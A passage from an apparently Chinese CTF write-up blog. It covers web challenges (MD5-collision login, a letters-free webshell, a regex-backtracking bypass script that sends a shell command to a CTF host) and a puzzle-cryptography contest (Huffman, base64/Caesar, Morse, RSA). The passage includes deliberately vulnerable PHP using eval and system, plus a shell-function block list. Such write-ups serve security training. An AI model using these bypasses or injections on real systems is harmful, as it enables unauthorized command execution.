class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-zA-Z0-9_$@]+/&quot;</span>,<span class="variable">$res</span>))&#123;      </span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$res</span>);    &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;      </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Soon&#x27;</span>);    </span><br><span class="line">        &#125;  &#125;&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;  <span class="keyword">die</span>(<span class="string">&quot;NOT NOT YET!&quot;</span>);&#125;</span><br><span class="line"><span class="meta">?&gt;</span> NOT NOT YET!</span><br></pre></td></tr></table></figure><p>本题第一关经典MD5，通过MD5强碰撞解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">password=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>接下来的过滤⽐较严格，我们注意到返回报文里的PHP版本：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/Normal_Shell.jpg" alt="Normalshell"></p><p>参考无字母无数字webshell的此文章：<a href="https://www.freebuf.com/articles/web/186298.html">https://www.freebuf.com/articles/web/186298.html</a><br>这里的preg_match多了对@的限制，我们仍然使⽤linux的通配符进⾏匹配：<br>题目过滤数字，所以我们使用数字和@之间特殊字符进行匹配：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/NormalShell.jpg" alt="Normalshell2"></p><p>根据这些以及文章内容构造出恶意POST包即可进行任意命令执行：<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Web/NormalShell_code.jpg" alt="Normalshell3"></p><h2 id="NormalUpload"><a href="#NormalUpload" class="headerlink" title="NormalUpload"></a>NormalUpload</h2><h2 id="NormalPreg"><a href="#NormalPreg" class="headerlink" title="NormalPreg"></a>NormalPreg</h2><p>原题代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$target</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line"><span class="variable">$code</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/php|cat|tac|assert|pcntl_exec|fwrite|curl|sleep|eval|system|assert|flag|shell_exec|passthru|exec|F10g|fl0g|fl1g|phar/i&quot;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$target</span>))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/but.*how/is&#x27;</span>,<span class="variable">$target</span>))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$target</span>,<span class="string">&#x27;but how&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">process</span>(<span class="variable">$code</span>));</span><br><span class="line">            </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;tip: backup file there&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NO there&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?</span><br></pre></td></tr></table></figure><p>本题考点是利用php的正则回溯次数上限进行绕过，以及linux通配符，使用下面的脚本就能解决：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;target&#x27;</span>: BytesIO(<span class="string">b&#x27;but how&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">1000000</span>),</span><br><span class="line">    <span class="string">&#x27;code&#x27;</span>:BytesIO(<span class="string">b&#x27;tail /*lag&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(<span class="string">&#x27;http://ctf.v50to.cc:10074/&#x27;</span>,data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>关于一些比较常见的 Preg 绕过问题可以学习这篇文章：<a href="https://blog.csdn.net/q20010619/article/details/120091191">https://blog.csdn.net/q20010619/article/details/120091191</a></p><h2 id="Normal-unserialize"><a href="#Normal-unserialize" class="headerlink" title="Normal-unserialize"></a>Normal-unserialize</h2><h2 id="Ezxsssss"><a href="#Ezxsssss" class="headerlink" title="Ezxsssss"></a>Ezxsssss</h2><h2 id="newnew"><a href="#newnew" class="headerlink" title="newnew"></a>newnew</h2><h2 id="Loggggg"><a href="#Loggggg" class="headerlink" title="Loggggg"></a>Loggggg</h2>]]></content>
      
      
      <categories>
          
          <category> 夺旗赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>“探索·解密” 趣味密码竞赛</title>
      <link href="/posts/797d.html"/>
      <url>/posts/797d.html</url>
      <cover>https://img02.anheyu.com/adminuploads/1/2022/09/15/6323395345502.jpg</cover>
      <date>Sat Nov 04 2023 16:08:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="JK编码"><a href="#JK编码" class="headerlink" title="JK编码"></a>JK编码</h2><p>根据⼀连串j和k组成的序列不难想到01序列，再由题⽬描述中提到的每个字母和数字都有⼀定的重要程度（即权重）不难猜到哈弗曼编码，再由题目给出的乱序序列 jkhafum_no…的前几个字母可以看到哈夫曼的英⽂，进⼀步得到验证。之后编写哈夫曼解码程序即可。</p><h2 id="逆转裁判"><a href="#逆转裁判" class="headerlink" title="逆转裁判"></a>逆转裁判</h2><p>由题目描述与提示，将图片文件逐字节逆序，在⼗六进制编辑器中搜索flag字符串即可，或者直接使用十六进制编辑器打开后搜索galf，也能达到相同目的。</p><h2 id="第二条古则"><a href="#第二条古则" class="headerlink" title="第二条古则"></a>第二条古则</h2><p>打开⽂件会见到⼀串不可理解的东⻄，然⽽题⽬要求从不可理解的事物中得到理解。说明答案就在其中。<br>根据提示“B站可能会倒闭，但绝不会变质。“，上B站搜索phony（对，就是那个被特意加粗的单 词），你会看到很多的MV，但只有⼀个MV是以镜面对称的形式呈现的。<br>只有这个MV和题干中的理解镜子中的伪物是相对应的，而且封面也是很明显的镜面字。<br>接下来打开它，一直看到标题出现的时候，会发现那是镜面字的生成过程，而题干中出现了大量的括号……<br>而且最重要的是，上下两行的括号正好是对应相反的。<br>那还等什么，把括号对应着拼起来。然后你就得到了⼀串01的序列，每五个隔断一次。将它们作为二进制数字转换为十进制，然后将这串数字和⼩写英⽂字母顺序对应，⽤flag{}将最后的内容包起来。</p><h2 id="第五条古则"><a href="#第五条古则" class="headerlink" title="第五条古则"></a>第五条古则</h2><p>首先打开文档，会发现这个文档里面有⼀些玄学的话语。<br>不管它们，最后一句话很重要：也许上帝早就在这上面留下了来自乐园的指引呢？<br>然⽽以正常视角查看会发现没有东⻄，说明本题一定考查了文件隐写。<br>将所有的⽂本加⼊到记事本中，你会发现额外多出来好几处乱码……</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">我简直不敢相信我所得到的这个答案：我可怜的迷途羔羊啊，我无法用现在的方式拯救你，但我已经尽我所能留下了痕迹，它将在很久以后被人察觉并破译出来。这个时间非常特别，他既不是1000年，也不是2000年，甚至他都并不是个能够被10整除的年份，它就是2023年。但也正因它很普通，他才能被人所铭记。</span><br><span class="line">假设乐园（Eden）真的存在，那进入乐园之人想必会沉迷其中，不会再出来了。但如果说有人出来证明乐园的存在，那这个人的行为本身就是对乐园的否定，因为它让那个人产生除了快乐以外的感觉，并没有包容一个人绝对的感性的能力。ErcmE3yrXA95RMAkAMS1</span><br><span class="line">那怎么办呢？我们貌似连“乐园的存在与否”这个问题都还没论证呢，它的衍生问题就已经是那么的让人难以回答了。hqWkWBWqgncxiK93</span><br><span class="line">乐园，可真是一个让人难以理解的东西啊。</span><br><span class="line">然而乐园这种东西真的是不存在的吗？至少昔日所感受的那名为“快乐”的情绪是真实的。我们所谓的每一个日常，其实也是接连不断发生的奇迹。当所有种类的“快乐”能够在一个区域同时出现时，那所谓“快乐的本源”也一定在其中。能够承载“快乐的本源”的地方，我想也只有那记载之中的乐园了。</span><br><span class="line">可它又会在哪里出现呢？RBqRC2OKC3WqXKOqkV==</span><br><span class="line">凯撒当年励精图治，可依旧没有达到那个乐园啊。</span><br><span class="line">我想这个问题只能留给后人回答了。</span><br><span class="line">也许上帝早就在这上面留下了来自乐园的指引呢？</span><br></pre></td></tr></table></figure><p>将三段拼起来，然后我们得到一串看上去很像base64编码的东⻄。<br>拼接结果：ErcmE3yrXA95RMAkAMS1hqWkWBWqgncxiK93RBqRC2OKC3WqXKOqkV&#x3D;&#x3D;<br>然而请注意文本中的“凯撒”，直接 base64解码是会报错的，你得找出那个用于加密偏移量才能够正确解码。开始爆破，你会得到偏移量为5（废话，第五条古则）。将其解码即可得到一串flag：<br>flag{fI_y0u_TsurT_Eden,lt_w1iL_bE_teHRe}<br>随便输⼊，反正不对。为什么？要是真就这样做出来了，我的第一条提示就没有意义了。<br>现在返回来查看第一条提示：啊哈哈，和你这个神棍的传教游戏，还挺愉快的呢。（纸撕碎的声音）<br>将其后缀改为zip解压后发现了一个名为eden.xml的文件，打开它。<br>最后又是一条被base64编码的提示，说人话就是给flag纠错，让它变成⼀条通顺的话语。<br>将之前得到的flag{fI_y0u_TsurT_Eden,lt_w1iL_bE_teHRe}进⾏纠错处理，并且根据最初得到的提示“明文均为小写”，更改出最后的正确答案。</p><h2 id="Art"><a href="#Art" class="headerlink" title="Art"></a>Art</h2><p>先代码审计得到decode()函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># 先把字母调换A换成Z，z换成a，然后倒序逐个字符转为二进制，在将二进制倒序逐步放⼊密文中</span></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> f.read():</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():  </span><br><span class="line">                <span class="keyword">if</span> char.islower():</span><br><span class="line">                    result += <span class="built_in">chr</span>(<span class="number">122</span> - <span class="built_in">ord</span>(char) + <span class="number">97</span>)  </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += <span class="built_in">chr</span>(<span class="number">90</span> - <span class="built_in">ord</span>(char) + <span class="number">65</span>)  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += char  <span class="comment"># 保留⾮字⺟字符</span></span><br><span class="line">        encrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>)[::-<span class="number">1</span>] <span class="keyword">for</span> char <span class="keyword">in</span> </span><br><span class="line">result[::-<span class="number">1</span>])</span><br><span class="line">        text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(encrypted_text[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, </span><br><span class="line"><span class="built_in">len</span>(encrypted_text), <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;m.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> w:</span><br><span class="line">        w.write(text)</span><br><span class="line"> <span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;m.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        binary_encoding = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&#x27;08b&#x27;</span>) <span class="keyword">for</span> char <span class="keyword">in</span> f.read())</span><br><span class="line">        decrypted_text = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(binary_encoding[i:i + <span class="number">8</span>][::-<span class="number">1</span>], <span class="number">2</span>)) <span class="keyword">for</span> i </span><br><span class="line"><span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_encoding), <span class="number">8</span>))</span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> decrypted_text[::-<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():  <span class="comment"># 仅处理字母字符</span></span><br><span class="line">                <span class="keyword">if</span> char.islower():</span><br><span class="line">                    result += <span class="built_in">chr</span>(<span class="number">122</span> - <span class="built_in">ord</span>(char) + <span class="number">97</span>) </span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    result += <span class="built_in">chr</span>(<span class="number">90</span> - <span class="built_in">ord</span>(char) + <span class="number">65</span>)  </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += char  <span class="comment"># 保留非字母字符</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment"># 测试</span></span><br><span class="line">encode()</span><br><span class="line"><span class="built_in">print</span>(decode())</span><br></pre></td></tr></table></figure><p>根据解出的特征进⾏base64解码（往往是数据的传输形式）<br>读艺术字即可获得flag</p><h2 id="Bacon"><a href="#Bacon" class="headerlink" title="Bacon"></a>Bacon</h2><p>题⽬描述是培根密码，但是以C为分界线，有的字符不是五个，所以我们根据培根密码的特征，联想到了最常见的只有两个字符的摩斯密码，只有两种可能性，我们将A转为. ，B 转为- </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">strr=<span class="string">&#x27;BAAAACBAAAACBAAAACBABACBAAAACABBBBCBAAAACBBAAACBBAAACBAAACBAAAACAAABBCBAAAACA</span></span><br><span class="line"><span class="string">ABACBAAAACACBAAAACBBAAACBBAAACAABBBCBAAAACABBBBCBBAAACAAAABCBBAAACAAAAACBAAAACBABAC</span></span><br><span class="line"><span class="string">BAAAACABBBBCBBAAACAAAABCBAAAACBBBBACBAAAACAABACBAAAACACBBAAACAAABBCAABBBCBAACBAAAAC</span></span><br><span class="line"><span class="string">AAABBCBAAAACABBBBCBAAAACAAABBCBBAAACABCBBAAACBBBAACBAAAACAAABBCBBAAACABCBAAAACBAAAA</span></span><br><span class="line"><span class="string">CBAAAACAABACBBAAACBBAAACBBAAACBAA&#x27;</span></span><br><span class="line">p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> strr.split(<span class="string">&#x27;C&#x27;</span>):</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">       <span class="keyword">if</span> i==<span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">           p+=<span class="string">&#x27;.&#x27;</span></span><br><span class="line">       <span class="keyword">if</span> i==<span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">           p+=<span class="string">&#x27;-&#x27;</span></span><br><span class="line">   p+=<span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><p>然后放在在线工具中解出摩斯密码，得到一串字符串<br>666C61677B636F6E67726174756C6174696F6E732D6361637A78637A666F777D<br>然后根据特征知道是字符串的16进制形式，用在线工具16进制转字符串即可获得flag</p><h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>原题</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;flag&#123;&#x27;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">b&#x27;&#125;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">57</span></span><br><span class="line"></span><br><span class="line">flag1 = flag[:<span class="number">14</span>]</span><br><span class="line">flag2 = flag[<span class="number">14</span>:<span class="number">28</span>]</span><br><span class="line">flag3 = flag[<span class="number">28</span>:<span class="number">42</span>]</span><br><span class="line">flag4 = flag[<span class="number">42</span>:]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q1</span>():</span><br><span class="line">    <span class="comment"># 奇怪的随机</span></span><br><span class="line">    random.seed(<span class="built_in">int</span>(time.time()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag1:</span><br><span class="line">        key = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(key ^ i)[<span class="number">2</span>:], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q2</span>():</span><br><span class="line">    <span class="comment"># 好像是RSA耶</span></span><br><span class="line">    p = getPrime(<span class="number">768</span>)</span><br><span class="line">    q = getPrime(<span class="number">768</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag2, <span class="string">&#x27;big&#x27;</span>), e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;gift = &#x27;</span>, p^q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q3</span>():</span><br><span class="line">    <span class="comment"># 好欸，gift会帮你大忙</span></span><br><span class="line">    p = getPrime(<span class="number">1024</span>)</span><br><span class="line">    q = getPrime(<span class="number">1024</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    c = <span class="built_in">pow</span>(<span class="built_in">int</span>.from_bytes(flag3, <span class="string">&#x27;big&#x27;</span>), e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;gift = &#x27;</span>, p&gt;&gt;<span class="number">128</span>&lt;&lt;<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q4</span>():</span><br><span class="line">    <span class="comment"># 好像是仿射密码O.o?</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">        <span class="keyword">if</span> gmpy2.gcd(a, <span class="number">256</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    b = random.randint(<span class="number">1</span>, <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag4:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>((a * i + b) % <span class="number">256</span>)[<span class="number">2</span>:], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q1()</span><br><span class="line">    q2()</span><br><span class="line">    q3()</span><br><span class="line">    q4()</span><br></pre></td></tr></table></figure><p>以下是输出哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">2751f014111e3b6c99ee0c1ffdb</span><br><span class="line">n = 1314967568472111655011215741611204058445271915416828628976948574202708111113415916782529564877904510060100803618784633689042321638758890645109937974712421243866535532456352916950588338339187646436203001238668325551347997600131482407828109866095656006182698438881347920478482748383266084375469393195026344711785310217699668578201163056580472767419018903528661196463556987391507948440998062000579441372864166820211363778622151084978457148816155840807309523468514737</span><br><span class="line">c = 714823142050694444798764890363987288553278765888515447347831293603591520430161682430297132349376978132042520437327068469772693958392477696379693493642863620785374026864080575939701745789140360488363320872736223330713870595633123116802744486276013405587197268990549236382568387872542676495602480646325253629669013709107520366724483033424481299421502754615414281425593755447617407229874129642080822627133940004511103227817223979099305528104304426752826435278744203</span><br><span class="line">gift =  694528314614597200478964686223773661923043423469284409313765066401043617480074529594821605533148713125208795494551521792270222854272201394082237861960338619535572344777791563055216095704867407678882350444988644328937569643241544288</span><br><span class="line">n = 20101595147488798389289868752077592121180253794961350303684476074373382651162731030012542663577893620308907070951746061694810120788982509030822305454034643552610490056731682663813203862472113551826607640566795678610949455082852245033866512073384496721650061160969170378452907296185135402960957516973093880566693353802761058535651054861356890198762625906274359149366964537600779463809503980853549061147727380608568295775123554356803159242239358725074252375272854601903195327695079676359178192820686851184017376039555552976394457195879284582630650973305825663350399524155712775283354061399128621452790374630281212763003</span><br><span class="line">c = 12916869040409779953862249590282734760889861257156464352877117728249327035935827174031177155628087674873344162482162598075083427663045411953253215416066596951253127182274293689595996627589876729221669619649677597183487460364944967147487385650490911248852929910928587491029306263562185263950606812592475864353923466852485771147419452880303553179714475139219893582609435132350841035206708438665812448813540495655049342336073923165823699487070835934846037597897302098717779471902780411938252727074409684431893731139714331370842123964447381194512912853698166082589121848926068491107342775937301790556130418367711223242288</span><br><span class="line">gift =  155273709359681889478466954690933897871319254905155359883381942077328267407476770359318044347630379957553960166391859807222785247670601013189925775520199087524163394638865369160945885653041774469602670214007577290385646748614938981814185337538533954972019132315963866996273805444698616794987042402666683564032</span><br><span class="line">4d9a25e42e9128de650722bde9dfe</span><br></pre></td></tr></table></figure><p>flag1使⽤暴力破解种子，已知种子为近期时间，爆破无需过久。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">e1</span>():</span><br><span class="line">    start = <span class="number">1694746197</span></span><br><span class="line">    end = <span class="number">1794832585</span></span><br><span class="line">    ci = <span class="built_in">bytearray</span>.fromhex(c1)</span><br><span class="line">    <span class="comment"># print(ci)</span></span><br><span class="line">    flag_str = <span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line">    key_str = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        key_str += <span class="built_in">bytes</span>([ci[i] ^ <span class="built_in">ord</span>(flag_str[i])])</span><br><span class="line">    <span class="comment"># print(key_str)</span></span><br><span class="line">    <span class="keyword">import</span> random</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        random.seed(i)</span><br><span class="line">        <span class="keyword">if</span> random.randint(<span class="number">0</span>, <span class="number">255</span>) == key_str[<span class="number">0</span>]:</span><br><span class="line">            <span class="keyword">if</span> 